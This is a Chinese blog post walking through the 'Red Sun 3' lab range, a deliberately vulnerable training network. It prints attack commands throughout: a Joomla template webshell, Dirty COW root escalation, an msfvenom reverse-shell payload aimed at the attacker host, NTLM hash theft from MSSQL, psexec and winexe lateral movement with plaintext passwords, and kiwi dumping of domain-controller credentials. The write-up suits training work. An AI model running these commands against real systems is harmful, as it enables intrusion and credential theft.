<!-- build time:Thu Jul 11 2024 19:16:02 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="ACK"><link rel="canonical" href="https://blog.xcu.icu/2024/06/29/InternalNet/ACK3/"><title>红日靶机3 - 内网 | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">红日靶机3</h1><div class="meta"><span class="item" title="创建时间：2024-06-29 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2024-06-29T00:00:00+08:00">2024-06-29</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>3.4k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>8 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/148.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/7.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/34.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/46.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/139.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/65.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/InternalNet/" itemprop="item" rel="index" title="分类于 内网"><span itemprop="name">内网</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2024/06/29/InternalNet/ACK3/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h1 id="环境配置"><a class="anchor" href="#环境配置">#</a> 环境配置</h1><p>这台靶机在下载导入到 vm 中后发现都是挂起状态，使用的是 vmnet2 这张网卡，分配的 ip 是 192.168.93 段，和直接桥接，这里添加一张网卡 vmnet2</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626100423622.png" alt="image-20240626100423622"></p><p>然后重启一下 web-centos 主机的网卡</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>/etc/init.d/networking restart</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626103554840.png" alt="image-20240626103554840"></p><h1 id="外围打点"><a class="anchor" href="#外围打点">#</a> 外围打点</h1><h2 id="信息收集"><a class="anchor" href="#信息收集">#</a> 信息收集</h2><p>还是从信息收集开始</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token number">192.168</span>.193.0/24</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626104558098.png" alt="image-20240626104558098"></p><p>经过判断可以知道这里这个 118 这台主机就是本次外围打点的主角了（至于判断过程 emmmm 我开热点就两台主机，乐），这里可以看到实际上这里就 3 个服务，22，80，3306。毕竟是靶场，还是比较套路的，这里先预判一手 80 端口上来个什么 sql 注入之类的，反正就是先安排到数据库，然后在数据库中找到点 “敏感信息”，利用一下这个 22 端口 (az</p><p>预判完事了也是先看一下运行的服务版本和然后使用 nmap 先来一下漏洞扫描</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token number">192.168</span>.193.0/24 -p22,80,3306 <span class="token parameter variable">-sV</span> <span class="token parameter variable">--script</span><span class="token operator">=</span>default</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626105955809.png" alt="image-20240626105955809"></p><p>这里也能获取到版本信息比如说 ssh 服务是 OpenSSH 5.3，http 服务是 nginx1.9.4，3306 是 mysql 5.7.27</p><p>值得注意是是这里扫描到 80 上存在 robots 文件，cms 是 Joomla，扫描一下版本</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626134420726.png" alt="image-20240626134420726"></p><p>版本是 3.9.12<span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VjcnNzLmNvbS9hcnRpY2xlcy8yOTgyNw==">Joomla 远程代码执行漏洞 (CVE-2021-23132) 预警 - 安全内参 | 决策者的网络安全知识库 (secrss.com)</span> 在网上也是检索到了一个远程代码执行的漏洞，不过利用的前置条件是需要登录到后台暂时搁置。这里去访问一下这个 http 服务和这个 robots 文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626110545289.png" alt="image-20240626110545289"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626110712547.png" alt="image-20240626110712547"></p><p>这个目录还是有点意思的简单探索一下，但是目录扫描还是必不可少的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626112234255.png" alt="image-20240626112234255"></p><p>31B 大小的都是空白页面，值得关注的有 1.php（这个是 phpinfo 页面），configuration.php~，htaccess.txt，LICENSE.txt，/web.config.txt</p><p>实际上最后能找到的点是这个备份的配置文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626114851421.png" alt="image-20240626114851421"></p><p>这里有数据库的连接信息，尝试连接一下，尝试是否能远程登录上这个 mysql 服务</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626134933572.png" alt="image-20240626134933572"></p><p>然后查看数据库中有没有什么有用的信息（预判成功 az）</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626135305476.png" alt="image-20240626135305476"></p><p>既然都连上数据库了就简单的试一下，发现这里是有机会直接写入文件的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626140614391.png" alt="image-20240626140614391"></p><p>不过当前是一个低权限用户</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626135026556.png" alt="image-20240626135026556"></p><p>这里存在一个角色表，尝试破解这个密码或者再写入一个账号就能利用上面找到的漏洞</p><h2 id="getshell"><a class="anchor" href="#getshell">#</a> getshell</h2><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626141429893.png" alt="image-20240626141429893"></p><p>这里直接选用最靠谱的方法，搭建了一个相同版本的 cms，这里生成的密码就是我自己设置的了。将这个密码复制过去就可以用我自己设置的密码登录了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626141711865.png" alt="image-20240626141711865"></p><p>然后通过 CVE-2021-23132 利用</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626142705537.png" alt="image-20240626142705537"></p><p>修改这里的模版</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626142851562.png" alt="image-20240626142851562"></p><p>在这里加入一句话</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626143003748.png" alt="image-20240626143003748"></p><p>然后通过 shell 工具连上就行了，这里还有 disable_function，也能直接使用蚁剑插件绕过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626144436939.png" alt="image-20240626144436939"></p><p>选择绕过插件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626144517974.png" alt="image-20240626144517974"></p><p>直接 run</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626144554005.png" alt="image-20240626144554005"></p><p>然后就可以快乐的执行命令了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626144626320.png" alt="image-20240626144626320"></p><h1 id="内网渗透"><a class="anchor" href="#内网渗透">#</a> 内网渗透</h1><h2 id="信息收集-2"><a class="anchor" href="#信息收集-2">#</a> 信息收集</h2><p>当前的权限很低，接下来就是尝试提权，因为蚁剑的终端比较难用，所以我想反弹 shell 出来，检测连通性的时候发现不出网</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626154059982.png" alt="image-20240626154059982"></p><p>发现这里的 ip 和我访问的 ip 不是同一个网段，而且也不是多网卡，很显然这台 web 服务是使用了反向代理。接着做信息收集</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626170110623.png" alt="image-20240626170110623"></p><p>翻了半天没想到在这，虽然说都会很刻意的放一点信息，但是你这个放在 tmp 目录稍微有点过分了。这里拿到了一组账号密码，尝试登录</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626170320494.png" alt="image-20240626170320494"></p><p>这里既然不是数据库的那就只剩下 ssh 了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626170743394.png" alt="image-20240626170743394"></p><p>看一下这个 ip 网卡信息</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626170827911.png" alt="image-20240626170827911"></p><p>可以看到这里就是两张网卡的了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626170902904.png" alt="image-20240626170902904"></p><p>也是出网的，现在就可以配置代理了。验证一下前面为什么拿到的 shell 是内网主机的 shell</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626171601569.png" alt="image-20240626171601569"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626171627408.png" alt="image-20240626171627408"></p><p>这里通过 nginx 反向代理</p><h2 id="提权"><a class="anchor" href="#提权">#</a> 提权</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZpcmVGYXJ0L2RpcnR5Y293">GitHub - firefart/dirtycow: Dirty Cow exploit - CVE-2016-5195</span></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240628115233903.png" alt="image-20240628115233903"></p><p>这里发现内核版本很低，该内核版本可以使用脏牛提权</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240628113924396.png" alt="image-20240628113924396"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240628115531860.png" alt="image-20240628115531860"></p><p>因为脏牛提权实际上是条件竞争，这里 cpu 满了，更加选项设置了一个新的密码</p><pre><code class="language-josn">firefart:fiKaC9KswdbbY:0:0:pwned:/root:/bin/bash
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240628115831032.png" alt="image-20240628115831032"></p><h2 id="上线msf"><a class="anchor" href="#上线msf">#</a> 上线 msf</h2><p>这个环境很理想，所以可以选择直接配置路由转发</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token parameter variable">-p</span> linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.193.219 <span class="token assign-left variable">LPROT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> elf <span class="token parameter variable">-o</span> shell</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626172950319.png" alt="image-20240626172950319"></p><p>在 msf 中</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626173147505.png" alt="image-20240626173147505"></p><p>将上面生成的 shell 上传到靶机上运行</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626173344001.png" alt="image-20240626173344001"></p><p>这里就拿到了一个 msf 的 shell</p><h2 id="代理"><a class="anchor" href="#代理">#</a> 代理</h2><h3 id="代理一"><a class="anchor" href="#代理一">#</a> 代理一</h3><p>首先查看网卡配置信息</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>run get_local_subnets</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626173801500.png" alt="image-20240626173801500"></p><p>值得我们注意的是这个 192.168.93 网段，这个 ip 很显然是内网 ip，接下类我们开启路由转发</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>run autoroute <span class="token parameter variable">-s</span> <span class="token number">192.168</span>.93.0/24</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626173849303.png" alt="image-20240626173849303"></p><p>可以看到，路由指向已经成功了，我们的 msf 可以将流量通过 session 转发到内网。但是我们别的攻击的使用还是有限制，这里配置一下 socks 代理</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>use auxiliary/server/socks_proxy</pre></td></tr><tr><td data-num="2"></td><td><pre>run</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626173917271.png" alt="image-20240626173917271"></p><p>socks 代理配置完成，然后我们可以使用 proxychains 工具来进行流量转发</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626174122698.png" alt="image-20240626174122698"></p><p>然后对内网的信息进行收集，使用 icmp 探测，这个比较快</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">254</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token parameter variable">-W</span> <span class="token number">1</span> <span class="token number">192.168</span>.93.<span class="token variable">$i</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"ttl"</span> <span class="token operator">&amp;</span> <span class="token keyword">done</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240626180758715.png" alt="image-20240626180758715"></p><p>存活的主机除了后面的 100 和 120 以外，这里又发现了 10,20,30 三台主机，分别使用 nmap 进行扫描</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240627155711629.png" alt="image-20240627155711629"></p><p>这里有一个 sqlserver 还是值得关注的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240627155850686.png" alt="image-20240627155850686"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240627164128072.png" alt="image-20240627164128072"></p><p>虽然但是，怎么想感觉直接拿到一个密码都很奇怪，所以这里换一种代理方式</p><h3 id="代理二"><a class="anchor" href="#代理二">#</a> 代理二</h3><p>​	因为如果不使用密码，相当与我拿到的 shell 是一个内网的 shell，相当于不出网的代理搭建这里基于 webshell 搭建代理使用 pystinger</p><p>将对应的 php 的 proxy 文件和 stinger_server 文件上传到网站目录，然后运行 stinger_server</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240627054745597.png" alt="image-20240627054745597"></p><p>在攻击机上运行</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./stinger_client <span class="token parameter variable">-w</span> http://192.168.193.118/proxy.php <span class="token parameter variable">-l</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-p</span> <span class="token number">1080</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240627054825561.png" alt="image-20240627054825561"></p><p>设置好 proxychains，简单试一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240627054921962.png" alt="image-20240627054921962"></p><p>这样就已经可以访问内网的环境了，接下来使用 nmap 对内网主机存活探测，这个代理扫描 emmm 炸的不要太快，但是存活的主机可以查看 arp 的内容</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>arp <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"ether"</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240627055327666.png" alt="image-20240627055327666"></p><p>太容易炸了，而且权限低，这里只是记录一下，还是用上面那个比较舒服</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240627065209657.png" alt="image-20240627065209657"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240627065159178.png" alt="image-20240627065159178"></p><p>​	这里使用 fscan 扫描得到的结果也是一样的，同时还爆出了一个账号密码，root 123 不过当前已经拿到 shell 了没做过高权限的账号密码或许我该前面就拿到，探测出来这个 10 是 DC，存在域 test，20 上还开放了一个 web 服务。虽然上台主机上都开放了 445 端口，但是没有能无脑直接打的什么永恒之蓝，这里将目光转向了 mssql，这个数据库的密码经过测试，前面 mysql 的用户名密码也能直接登录。</p><h2 id="ntlm-relay"><a class="anchor" href="#ntlm-relay">#</a> NTLM Relay</h2><p>扫描域内机器的 SMB 签名的开放情况</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>proxychains python tools/RunFinger.py <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.93.10</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240627171912998.png" alt="image-20240627171912998"></p><p>利用 <span class="exturl" data-url="aHR0cDovL011bHRpUmVsYXkucHk=">MultiRelay.py</span> 攻击</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>use auxiliary/admin/mssql/mssql_ntlm_stealer</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.93.20</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">set</span> smbproxy <span class="token number">192.168</span>.93.100</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin class-name">set</span> username testuser</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin class-name">set</span> password cvcvgjASD<span class="token operator">!</span>@</pre></td></tr><tr><td data-num="6"></td><td><pre>run</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240627175836013.png" alt="image-20240627175836013"></p><p>到这里抓取到 hash</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240628154343644.png" alt="image-20240628154343644"></p><p>使用 john 破解</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240628161521726.png" alt="image-20240628161521726"></p><h2 id="内网横向"><a class="anchor" href="#内网横向">#</a> 内网横向</h2><p>已经拿到密码了，这里使用 smbclient 查看目标是否开启了 ipc 共享</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240628162226442.png" alt="image-20240628162226442"></p><p>然后就可以通过 winexe 来拿到 shell</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>proxychains winexe <span class="token parameter variable">-U</span> administrator%123qwe<span class="token punctuation">\</span><span class="token operator">!</span>ASD <span class="token parameter variable">--uninstall</span> <span class="token parameter variable">--system</span> //192.168.93.20 cmd.exe</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240628173439902.png" alt="image-20240628173439902"></p><p>或者直接使用 msf，20 和 30 两台主机密码是相同的（绝对不是我敲错了 az）</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>use exploit/windows/smb/psexec</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">set</span> SMBUser administrator</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin class-name">set</span> SMBPass 123qwe<span class="token operator">!</span>ASD</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.93.30</pre></td></tr><tr><td data-num="6"></td><td><pre>run</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240628174622433.png" alt="image-20240628174622433"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240628180133793.png" alt="image-20240628180133793"></p><p>简单用 kiwi 试一下，也是可以成功的，相同的方法上线 20，使用 kiwi 抓取到 dc 的账号密码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20240628180905953.png" alt="image-20240628180905953"></p><div class="tags"><a href="/tags/ACK/" rel="tag"><i class="ic i-tag"></i> ACK</a></div></div><footer><div class="meta"><span id="2024/06/29/InternalNet/ACK3/" class="item leancloud_visitors" data-flag-title="红日靶机3" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2024/06/29/InternalNet/ACK3/" title="红日靶机3">https://blog.xcu.icu/2024/06/29/InternalNet/ACK3/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2024/06/15/Casualessay/Scan_Python/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;132.jpg" title="Scan_Python"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 随笔</span><h3>Scan_Python</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">外围打点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">2.2.</span> <span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFmsf"><span class="toc-number">3.3.</span> <span class="toc-text">上线 msf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86"><span class="toc-number">3.4.</span> <span class="toc-text">代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E4%B8%80"><span class="toc-number">3.4.1.</span> <span class="toc-text">代理一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E4%BA%8C"><span class="toc-number">3.4.2.</span> <span class="toc-text">代理二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ntlm-relay"><span class="toc-number">3.5.</span> <span class="toc-text">NTLM Relay</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91"><span class="toc-number">3.6.</span> <span class="toc-text">内网横向</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2024/03/05/InternalNet/FRP&&NPS%E4%BD%BF%E7%94%A8/" rel="bookmark" title="FRP&&NPS搭建">FRP&&NPS搭建</a></li><li><a href="/2024/03/06/InternalNet/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" rel="bookmark" title="MSF工具的基本使用">MSF工具的基本使用</a></li><li><a href="/2024/03/11/InternalNet/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%81%9A%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/" rel="bookmark" title="记第一次做内网靶机（红日1）">记第一次做内网靶机（红日1）</a></li><li><a href="/2024/03/12/InternalNet/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E4%BA%8C%E6%AC%A1%E9%9D%B6%E6%9C%BA/" rel="bookmark" title="红日靶机2">红日靶机2</a></li><li><a href="/2024/03/14/InternalNet/ACK4/" rel="bookmark" title="红日靶机4">红日靶机4</a></li><li><a href="/2024/03/21/InternalNet/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%EF%BC%88%E7%90%86%E8%AE%BA%EF%BC%89/" rel="bookmark" title="内网渗透测试基础">内网渗透测试基础</a></li><li><a href="/2024/03/25/InternalNet/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="bookmark" title="域环境搭建">域环境搭建</a></li><li><a href="/2024/04/13/InternalNet/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="bookmark" title="内网-本机信息收集">内网-本机信息收集</a></li><li><a 